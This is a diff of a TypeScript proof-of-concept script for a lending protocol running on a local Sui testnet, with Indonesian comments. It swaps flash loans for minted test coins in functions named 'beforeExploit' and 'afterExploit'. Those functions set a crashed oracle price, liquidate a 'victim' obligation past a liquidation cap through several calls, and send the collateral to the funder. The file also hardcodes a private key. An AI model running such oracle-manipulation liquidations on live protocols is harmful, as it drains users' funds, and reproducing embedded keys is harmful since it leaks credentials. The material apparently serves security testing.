@@ -13,22 +13,22 @@ import { decodeSuiPrivateKey } from '@mysten/sui/cryptography';
 const client = new SuiClient({ url: 'http://127.0.0.1:9000' });
 
 // ==================== KONFIGURASI LOCAL TESTNET (ID TERBARU) ====================
-// Dari output_protocol_baru9.txt (Digest: 3UHTmtXxRXLEgDZ3sDDiTGgDmjmPQj1rH3nee5XCwHU2)
-const PKG = "0x6feb7fbb6eb0ff281cc34b62fe154126f8aa29f71d4bfefcadd0c88ada5d8750";
-const VERSION = "0x82fa0adb54a642bdac9ba2508db73d388edc914f670e4a2d78e699e3a66296c8";
-const MARKET = "0x36760fc3fa256288b2e7f2c59e7139d07884537952b09ae51e45ae2983584c93";
-const ORACLE = "0x59e9a6be6594cb4c79aacedecd705ce7aafb625182e9298d73c5f2a927d2760b";
-const REGISTRY = "0x17229383f53c442b474b463a3407cc42cee279e165e2944ac0841d0a092e8d92";
+// Dari output_protocol_baru9 (1).txt (Digest: CqnnvaFvY8te4YT22jEtVuFRm4B6ig4DwUzvfUVvNPNN)
+const PKG = "0xec652b75053deb3d01692f910a55ab4ecee3510bc0d527c132cb3b58bffa1257";
+const VERSION = "0x3729ad6d084cbfe9ca2b13b9a7248edbd5cec6bf3a8898ce550bb9fb7373aeaa";
+const MARKET = "0xd035827b1567b41dc4d8280e67117365aba6cc81214ac53633e6a93d00cdff10";
+const ORACLE = "0xc01c1f4b6cd172c5265140d272f4b94516ac3d6b0c3d784221aebf3dda41c36c";
+const REGISTRY = "0x077d4c05f711ede102e0fbf978a85b7f22e68d454dbf180a07dc085ce099867d";
 const CLOCK = "0x6";
 
-// Dari output_testcoin_baru9.txt (Digest: Bu9pJo7zjQgUhZHip3Xv2p5nDkpKSkUcwLBydbtRGyx9)
-const TEST_COIN_PKG = "0x97e73b1290e3852628fb05717c0e19828949d585b32f9b57f1d74084c8c6d729";
+// Dari output_testcoin_baru9 (1).txt (Digest: DCgtNn2s9eEtcUw8TkchtZen3AxP1KVNmKmEKdKqZ1GV)
+const TEST_COIN_PKG = "0x77ba6f3eb92c022ae641df34570319d037b553816421930c141492e7ec75abfd";
 const USDC_TYPE = `${TEST_COIN_PKG}::usdc::USDC`;
 const ETH_TYPE = `${TEST_COIN_PKG}::eth::ETH`;
 const SUI_TYPE = "0x2::sui::SUI";
 
-const USDC_TREASURY = "0xde18fc99ac5cd11358a1abe228385e092d1f352797ade6dcffb1ad47122279da";
-const ETH_TREASURY = "0x5e63d5ba2f07248db0ec68b09ad60173c37374dbd37ca8b8be3bb5d25bfd9c23";
+const USDC_TREASURY = "0xfbe2e7b022265773df2c93ca8f12908eeff7d38bfa3b85b601ceaa5d49f36e6c";
+const ETH_TREASURY = "0x53ed9beb8c7b29d49a63238d38af9ddbf1f0e0802dc59c0f38260a27e09ba4c6";
 
 // PRIVATE KEY FUNDER
 const funderPrivateKeyStr = "suiprivkey1qzuxayfjwjmrqat03vkjh5nrt66fp4utywud2x8v0k0a6fg453yg7j2kcaa";
@@ -507,34 +507,19 @@ async function beforeExploit_singleCall(victimObligationId, xOraclePkg) {
     // PERBAIKAN: Harga crashed SUI $0.40
     updatePrices(tx, xOraclePkg, 400_000_000n, 1_000_000_000n, 2_000_000_000_000n);
 
-    // Total Debt is $500. 20% cap = $100. We flashloan 100 USDC to repay exactly $100.
-    const [flashUSDC, flashReceipt] = tx.moveCall({
-        target: `${PKG}::flash_loan::borrow_flash_loan`,
-        typeArguments: [USDC_TYPE],
-        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(100_000_000_000n)],
+    // PERBAIKAN: Mint USDC langsung alih-alih pakai Flashloan
+    const [repayUSDC] = tx.moveCall({
+        target: `${TEST_COIN_PKG}::usdc::mint`,
+        arguments: [tx.object(USDC_TREASURY), tx.pure.u64(100_000_000_000n)],
     });
 
     const [remainUSDC, collateralCoin] = tx.moveCall({
         target: `${PKG}::liquidate::liquidate`,
         typeArguments: [USDC_TYPE, SUI_TYPE],
-        arguments: [
-            tx.object(VERSION),
-            tx.object(victimObligationId),
-            tx.object(MARKET),
-            flashUSDC,
-            tx.object(REGISTRY),
-            tx.object(ORACLE),
-            tx.object(CLOCK),
-        ],
+        arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), repayUSDC, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)],
     });
 
-    tx.moveCall({
-        target: `${PKG}::flash_loan::repay_flash_loan`,
-        typeArguments: [USDC_TYPE],
-        arguments: [tx.object(VERSION), tx.object(MARKET), remainUSDC, flashReceipt],
-    });
-
-    tx.transferObjects([collateralCoin], funderAddress);
+    tx.transferObjects([remainUSDC, collateralCoin], funderAddress);
 
     await executeTx(tx, funderKeypair);
     const stateAfter = await readObligationState(victimObligationId);
@@ -557,61 +542,30 @@ async function afterExploit_multiCall(victimObligationId, xOraclePkg) {
     // PERBAIKAN: Harga crashed SUI $0.40
     updatePrices(tx, xOraclePkg, 400_000_000n, 1_000_000_000n, 2_000_000_000_000n);
 
-    // Flashloan 100 USDC ($100) and 0.05 ETH ($100) to hit $200 liquidation cap
-    const [f_USDC, r_USDC] = tx.moveCall({
-        target: `${PKG}::flash_loan::borrow_flash_loan`,
-        typeArguments: [USDC_TYPE],
-        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(100_000_000_000n)],
+    // PERBAIKAN: Mint USDC dan ETH langsung alih-alih pakai Flashloan
+    const [repayUSDC1] = tx.moveCall({
+        target: `${TEST_COIN_PKG}::usdc::mint`,
+        arguments: [tx.object(USDC_TREASURY), tx.pure.u64(100_000_000_000n)],
     });
-
-    const [f_ETH, r_ETH] = tx.moveCall({
-        target: `${PKG}::flash_loan::borrow_flash_loan`,
-        typeArguments: [ETH_TYPE],
-        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000n)],
+    const [repayETH1] = tx.moveCall({
+        target: `${TEST_COIN_PKG}::eth::mint`,
+        arguments: [tx.object(ETH_TREASURY), tx.pure.u64(50_000_000n)],
     });
 
     const [rem1, c1] = tx.moveCall({
         target: `${PKG}::liquidate::liquidate`,
         typeArguments: [USDC_TYPE, SUI_TYPE],
-        arguments: [
-            tx.object(VERSION),
-            tx.object(victimObligationId),
-            tx.object(MARKET),
-            f_USDC,
-            tx.object(REGISTRY),
-            tx.object(ORACLE),
-            tx.object(CLOCK),
-        ],
+        arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), repayUSDC1, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)],
     });
 
     const [rem2, c2] = tx.moveCall({
         target: `${PKG}::liquidate::liquidate`,
         typeArguments: [ETH_TYPE, SUI_TYPE],
-        arguments: [
-            tx.object(VERSION),
-            tx.object(victimObligationId),
-            tx.object(MARKET),
-            f_ETH,
-            tx.object(REGISTRY),
-            tx.object(ORACLE),
-            tx.object(CLOCK),
-        ],
-    });
-
-    tx.moveCall({
-        target: `${PKG}::flash_loan::repay_flash_loan`,
-        typeArguments: [USDC_TYPE],
-        arguments: [tx.object(VERSION), tx.object(MARKET), rem1, r_USDC],
-    });
-
-    tx.moveCall({
-        target: `${PKG}::flash_loan::repay_flash_loan`,
-        typeArguments: [ETH_TYPE],
-        arguments: [tx.object(VERSION), tx.object(MARKET), rem2, r_ETH],
+        arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), repayETH1, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)],
     });
 
     tx.mergeCoins(c1, [c2]);
-    tx.transferObjects([c1], funderAddress);
+    tx.transferObjects([rem1, rem2, c1], funderAddress);
 
     await executeTx(tx, funderKeypair);
     const stateAfter = await readObligationState(victimObligationId);
